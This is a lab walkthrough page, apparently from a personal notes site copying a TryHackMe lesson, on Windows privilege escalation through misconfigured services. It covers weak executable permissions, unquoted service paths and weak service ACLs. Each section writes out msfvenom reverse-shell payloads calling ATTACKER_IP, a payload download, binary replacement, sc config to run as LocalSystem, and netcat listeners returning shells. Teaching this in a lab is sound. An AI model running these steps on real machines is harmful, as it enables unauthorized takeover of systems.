@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="generator" content="mkdocs-1.4.3, mkdocs-terminal-4.4.0">
+     
+     
+    <link rel="icon" type="image/png" sizes="192x192" href="../img/android-chrome-192x192.png" />
+<link rel="icon" type="image/png" sizes="512x512" href="../img/android-chrome-512x512.png" />
+<link rel="apple-touch-icon" sizes="180x180" href="../img/apple-touch-icon.png" />
+<link rel="shortcut icon" type="image/png" sizes="48x48" href="../img/favicon.ico" />
+<link rel="icon" type="image/png" sizes="16x16" href="../img/favicon-16x16.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="../img/favicon-32x32.png" />
+
+
+    
+ 
+<title>ServiceMisconfiguration - My Docs</title>
+
+
+<link href="../css/fontawesome/css/fontawesome.min.css" rel="stylesheet">
+<link href="../css/fontawesome/css/solid.min.css" rel="stylesheet">
+<link href="../css/normalize.css" rel="stylesheet">
+<link href="../css/terminal.css" rel="stylesheet">
+<link href="../css/theme.css" rel="stylesheet">
+<link href="../css/theme.tile_grid.css" rel="stylesheet">
+<link href="../css/theme.footer.css" rel="stylesheet">
+<!-- gruvbox_dark color palette -->
+<link href="../css/palettes/gruvbox_dark.css" rel="stylesheet">
+
+<!-- page layout -->
+<style>
+/* initially set page layout to a one column grid */
+.terminal-mkdocs-main-grid {
+    display: grid;
+    grid-column-gap: 1.4em;
+    grid-template-columns: auto;
+    grid-template-rows: auto;
+}
+
+/*  
+*   when side navigation is not hidden, use a two column grid.  
+*   if the screen is too narrow, fall back to the initial one column grid layout.
+*   in this case the main content will be placed under the navigation panel. 
+*/
+@media only screen and (min-width: 70em) {
+    .terminal-mkdocs-main-grid {
+        grid-template-columns: 4fr 9fr;
+    }
+}</style>
+
+
+
+     
+    
+    
+
+    
+    <!-- search css support -->
+<link href="../css/search/bootstrap-modal.css" rel="stylesheet">
+<!-- search scripts -->
+<script>
+    var base_url = "..",
+    shortcuts = "{}";
+</script>
+<script src="../js/jquery/jquery-1.10.1.min.js" defer></script>
+<script src="../js/bootstrap/bootstrap.min.js" defer></script>
+<script src="../js/mkdocs/base.js" defer></script>
+    
+    
+    
+    
+    <script src="../search/main.js"></script>
+    
+
+    
+</head>
+
+<body class="terminal"><div class="container">
+    <div class="terminal-nav">
+        <header class="terminal-logo">
+            <div id="mkdocs-terminal-site-name" class="logo terminal-prompt"><a href="/" class="no-style">My Docs</a></div>
+        </header>
+        
+        <nav class="terminal-menu">
+            
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href=".." class="menu-item " property="item" typeof="WebPage">
+                        <span property="name">About Me</span>
+                    </a>
+                    <meta property="position" content="0">
+                </li>
+                
+                
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href="../abusing_priviliges/" class="menu-item " property="item" typeof="WebPage">
+                        <span property="name">Writeups</span>
+                    </a>
+                    <meta property="position" content="1">
+                </li>
+                
+                
+                
+                
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href="./" class="menu-item active" property="item" typeof="WebPage">
+                        <span property="name">ServiceMisconfiguration</span>
+                    </a>
+                    <meta property="position" content="2">
+                </li>
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href="../vulnerableSoftware/" class="menu-item " property="item" typeof="WebPage">
+                        <span property="name">VulnerableSoftwares</span>
+                    </a>
+                    <meta property="position" content="3">
+                </li>
+                
+                    
+                    
+
+
+<li property="itemListElement" typeof="ListItem">
+    <a href="#" class="menu-item" data-toggle="modal" data-target="#mkdocs_search_modal" property="item" typeof="SearchAction">
+        <i aria-hidden="true" class="fa fa-search"></i> <span property="name">Search</span>
+    </a>
+    <meta property="position" content="4">
+</li>
+                    
+            </ul>
+            
+        </nav>
+    </div>
+</div>
+        
+    <div class="container">
+        <div class="terminal-mkdocs-main-grid"><aside id="terminal-mkdocs-side-panel"><nav>
+  
+    <ul class="terminal-mkdocs-side-nav-items">
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="..">About Me</a>
+        
+    
+    
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+        
+        
+            
+            
+                
+                
+        
+
+             
+            
+    
+        
+        <a class="
+
+    terminal-mkdocs-side-nav-item" href="../About_Me/">About</a>
+    
+    
+        
+      
+        
+            <ul class="terminal-mkdocs-side-nav-li-ul">
+            
+    </ul>
+        
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="../abusing_priviliges/">Writeups</a>
+        
+    
+    
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+        
+        
+            
+                
+        
+
+        
+            
+    
+        
+        
+            
+            
+            <span class="
+        
+            
+        
+    
+
+    terminal-mkdocs-side-nav-item terminal-mkdocs-side-nav-section-no-index">Linux</span>
+        
+    
+    
+        
+      
+        
+            <ul class="terminal-mkdocs-side-nav-li-ul">
+        
+            
+            
+                
+                
+            
+
+             
+                <li class="terminal-mkdocs-side-nav-li-ul-li">
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="../abusing_priviliges/">tryhackme</a>
+        
+    
+    </li>
+            
+        
+            
+            
+                
+                
+            
+
+             
+                <li class="terminal-mkdocs-side-nav-li-ul-li">
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="../abusing_priviliges/">hackthebox</a>
+        
+    
+    </li>
+            
+            
+    </ul>
+        
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+        
+        
+            
+            
+                
+                
+        
+
+             
+            
+    
+        
+        <a class="
+
+    terminal-mkdocs-side-nav-item" href="../vulnerableSoftware/">PrivilegeEscalation</a>
+    
+    
+        
+      
+        
+            <ul class="terminal-mkdocs-side-nav-li-ul">
+        
+            
+            
+                
+                
+                    
+                
+            
+
+            
+                <li class="terminal-mkdocs-side-nav-li-ul-li">
+    
+        
+        <a class="
+
+    terminal-mkdocs-side-nav-item" href="./">Windows</a>
+    
+    </li>
+            
+            
+    </ul>
+        
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        <span class="
+
+    terminal-mkdocs-side-nav-item--active">ServiceMisconfiguration</span>
+    
+    
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="../vulnerableSoftware/">VulnerableSoftwares</a>
+        
+    
+    
+    
+  </li>
+        
+    </ul>
+  
+</nav><hr>
+<nav>
+    <ul>
+        <li><a href="#windows-services">Windows Services</a></li>
+        <li><a href="#insecure-permissions-on-service-executable">Insecure Permissions on Service Executable</a></li>
+        <li><a href="#unquoted-service-paths">Unquoted Service Paths</a></li>
+        <li><a href="#insecure-service-permissions">Insecure Service Permissions</a></li>
+        
+    </ul>
+</nav>
+</aside>
+            <main id="terminal-mkdocs-main-content">
+<section id="mkdocs-terminal-content">
+    <h2 id="windows-services">Windows Services<a class="headerlink" href="#windows-services" title="Anchor link to this section for reference">#</a></h2>
+<p>Windows services are managed by the <strong>Service Control Manager</strong> (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.</p>
+<p>Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.</p>
+<p>To better understand the structure of a service, let's check the apphostsvc service configuration with the <code>sc qc</code> command:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc qc apphostsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: apphostsvc
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Application Host Helper Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem
+</code></pre>
+<p>Here we can see that the associated executable is specified through the <strong>BINARY_PATH_NAME</strong> parameter, and the account used to run the service is shown on the <strong>SERVICE_START_NAME</strong> parameter.</p>
+<p>Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):</p>
+<p><img alt="Service DACL" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png" />  </p>
+<p>All of the services configurations are stored on the registry under <code>HKLM\SYSTEM\CurrentControlSet\Services\</code>:</p>
+<p><img alt="Service registry entries" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png" />  </p>
+<p>A subkey exists for every service in the system. Again, we can see the associated executable on the <strong>ImagePath</strong> value and the account used to start the service on the <strong>ObjectName</strong> value. If a DACL has been configured for the service, it will be stored in a subkey called <strong>Security</strong>. As you have guessed by now, only administrators can modify such registry entries by default.</p>
+<h2 id="insecure-permissions-on-service-executable">Insecure Permissions on Service Executable<a class="headerlink" href="#insecure-permissions-on-service-executable" title="Anchor link to this section for reference">#</a></h2>
+<p>If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.</p>
+<p>To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using <code>sc</code>:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcuser1
+</code></pre>
+<p>We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in <code>C:\Progra~2\System~1\WService.exe</code>. We then proceed to check the permissions on the executable:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre>
+<p>And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.</p>
+<p>Let's generate an exe-service payload using msfvenom and serve it through a python webserver:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+
+user@attackerpc$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<p>We can then pull the payload from Powershell with the following command:</p>
+<p>Powershell</p>
+<pre><code class="language-shell-session">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+</code></pre>
+<p>Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\
+
+C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+</code></pre>
+<p>We start a reverse listener on our attacker machine:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ nc -lvp 4445
+</code></pre>
+<p>And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc stop windowsscheduler
+C:\&gt; sc start windowsscheduler
+</code></pre>
+<p><strong>Note:</strong> PowerShell has <code>sc</code> as an alias to <code>Set-Content</code>, therefore you need to use <code>sc.exe</code> in order to control services with PowerShell this way.</p>
+<p>As a result, you'll get a reverse shell with svcusr1 privileges:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ nc -lvp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.10.175.90 50649
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+wprivesc1\svcusr1
+</code></pre>
+<p>Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.</p>
+<h2 id="unquoted-service-paths">Unquoted Service Paths<a class="headerlink" href="#unquoted-service-paths" title="Anchor link to this section for reference">#</a></h2>
+<p>When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.</p>
+<p>When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.</p>
+<p>As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by <code>"C:\Program Files\RealVNC\VNC Server\vncserver.exe"</code>, followed by the given parameters:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc qc &quot;vncserver&quot;
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: vncserver
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : &quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot; -service
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : VNC Server
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+</code></pre>
+<p><strong>Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.</strong><br />
+Now let's look at another service without proper quotation:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc qc &quot;disk sorter enterprise&quot;
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+</code></pre>
+<p>When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Argument 1</th>
+<th>Argument 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C:\MyPrograms\Disk.exe</td>
+<td>Sorter</td>
+<td>Enterprise\bin\disksrs.exe</td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk Sorter.exe</td>
+<td>Enterprise\bin\disksrs.exe</td>
+<td></td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute <code>C:\\MyPrograms\\Disk.exe</code> and take the rest as arguments.</p>
+<p>Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:</p>
+<ol>
+<li>First, search for <code>C:\\MyPrograms\\Disk.exe</code>. If it exists, the service will run this executable.</li>
+<li>If the latter doesn't exist, it will then search for <code>C:\\MyPrograms\\Disk Sorter.exe</code>. If it exists, the service will run this executable.</li>
+<li>If the latter doesn't exist, it will then search for <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>. This option is expected to succeed and will typically be run in a default installation.</li>
+</ol>
+<p>From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.</p>
+<p>While this sounds trivial, most of the service executables will be installed under <code>C:\Program Files</code> or <code>C:\Program Files (x86)</code> by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.</p>
+<p>In our case, the Administrator installed the Disk Sorter binaries under <code>c:\MyPrograms</code>. By default, this inherits the permissions of the <code>C:\</code> directory, which allows any user to create files and folders in it. We can check this using <code>icacls</code>:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt;icacls c:\MyPrograms
+c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
+              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre>
+<p>The <code>BUILTIN\\Users</code> group has <strong>AD</strong> and <strong>WD</strong> privileges, allowing the user to create subdirectories and files, respectively.</p>
+<p>The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+
+user@attackerpc$ nc -lvp 4446
+</code></pre>
+<p>Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to <code>C:\MyPrograms\Disk.exe</code>. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+
+C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+        Successfully processed 1 files.
+</code></pre>
+<p>Once the service gets restarted, your payload should execute:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc stop &quot;disk sorter enterprise&quot;
+C:\&gt; sc start &quot;disk sorter enterprise&quot;
+</code></pre>
+<p>As a result, you'll get a reverse shell with svcusr2 privileges:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ nc -lvp 4446
+Listening on 0.0.0.0 4446
+Connection received on 10.10.175.90 50650
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+wprivesc1\svcusr2
+</code></pre>
+<p>Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.</p>
+<h2 id="insecure-service-permissions">Insecure Service Permissions<a class="headerlink" href="#insecure-service-permissions" title="Anchor link to this section for reference">#</a></h2>
+<p>You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.</p>
+<p>To check for a service DACL from the command line, you can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a> from the Sysinternals suite. For your convenience, a copy is available at <code>C:\\tools</code>. The command to check for the thmservice service DACL is:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+</code></pre>
+<p>Here we can see that the <code>BUILTIN\\Users</code> group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.</p>
+<p>Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+
+user@attackerpc$ nc -lvp 4447
+</code></pre>
+<p>We will then transfer the reverse shell executable to the target machine and store it in <code>C:\Users\thm-unpriv\rev-svc3.exe</code>. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+</code></pre>
+<p>To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem
+</code></pre>
+<p>Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; sc stop THMService
+C:\&gt; sc start THMService
+</code></pre>
+<p>And we will receive a shell back in our attacker's machine with SYSTEM privileges:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ nc -lvp 4447
+Listening on 0.0.0.0 4447
+Connection received on 10.10.175.90 50650
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+NT AUTHORITY\SYSTEM
+</code></pre>
+<p>Go to the Administrator's desktop to retrieve a flag. Don't forget to input the flag at the end of this task.</p>
+</section>
+
+            </main>
+        </div>
+        <hr><footer>
+    <div class="terminal-mkdocs-footer-grid">
+        <div id="terminal-mkdocs-footer-copyright-info">
+             Site built with <a href="http://www.mkdocs.org">MkDocs</a> and <a href="https://github.com/ntno/mkdocs-terminal">Terminal for MkDocs</a>.
+        </div>
+        <div id="terminal-mkdocs-footer-prev-next">
+            <nav class="btn-group">
+                <a href="./" title="Index">Previous</a>
+                |
+                <a href="../vulnerableSoftware/" title="VulnerableSoftwares">Next</a>
+            </nav>
+        </div>
+    </div>
+</footer>
+    </div>
+
+    
+    <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="alertdialog" aria-modal="true" aria-labelledby="searchModalLabel">
+    <div class="modal-dialog modal-lg" role="search">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="searchModalLabel">Search</h5>
+                <button type="button" class="close btn btn-default btn-ghost" data-dismiss="modal"><span aria-hidden="true">x</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p id="searchInputLabel">Type to start searching</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" aria-labelledby="searchInputLabel" placeholder="" id="mkdocs-search-query" title="Please enter search terms here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No document matches found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</body>
+
+</html>
